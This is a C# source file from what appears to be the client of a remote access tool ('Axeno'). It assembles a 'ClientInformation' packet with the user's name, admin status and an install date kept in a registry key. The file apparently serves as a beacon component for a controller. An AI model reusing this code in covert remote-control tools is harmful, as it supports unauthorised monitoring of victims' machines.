using Axeno.Client.Properties;
using MessagePackLib.MessagePack;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Client.Helper
{
    internal class SendInfo
    {
        public static byte[] GetAndSendInformation()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInformation";
            msgpack.ForcePathObject("Group").AsString = "Default";
            msgpack.ForcePathObject("Username").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("Applevel").AsString = IsAdministrator();
            msgpack.ForcePathObject("Instdate").AsString = InstallDate();
            return msgpack.Encode2Bytes();
        }
        public static string InstallDate()
        {
            RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings");
            if (keyopen != null )
            {
                string instdate = keyopen.GetValue("Install_Date").ToString();
                keyopen.Close();
                return instdate;
            }else
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\AxenoSettings");
                key.SetValue("Install_Date", DateTime.Today.ToString("dd-MM-yy"));
                key.Close();
                return DateTime.Today.ToString("dd-MM-yy");
            }


        }
        public static string IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return "Administrator";
            }else
            {
                return "Usermode";
            }

        }

    }
}
